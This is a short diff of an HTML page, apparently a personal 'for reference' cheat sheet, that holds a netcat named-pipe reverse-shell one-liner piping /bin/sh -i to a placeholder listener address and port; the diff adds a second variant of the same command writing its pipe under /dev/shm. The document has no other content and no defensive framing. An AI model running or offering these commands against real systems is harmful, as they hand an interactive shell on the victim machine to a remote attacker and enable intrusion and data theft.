@@ -6,5 +6,5 @@
 </head><body>For reference<br/>
 <br/>
 rm /tmp/j; mkfifo /tmp/j; cat /tmp/j | /bin/sh -i 2&gt;&amp;1 | nc &lt;LIP&gt; &lt;LPORT&gt; &gt; /tmp/j<br/>
-<br/>
+rm /dev/shm/j; mkfifo /dev/shm/j; cat /dev/shm/j | /bin/sh -i 2&gt;&amp;1 | nc &lt;LIP&gt; &lt;LPORT&gt; &gt; /dev/shm/j<br/>
 </body></html>
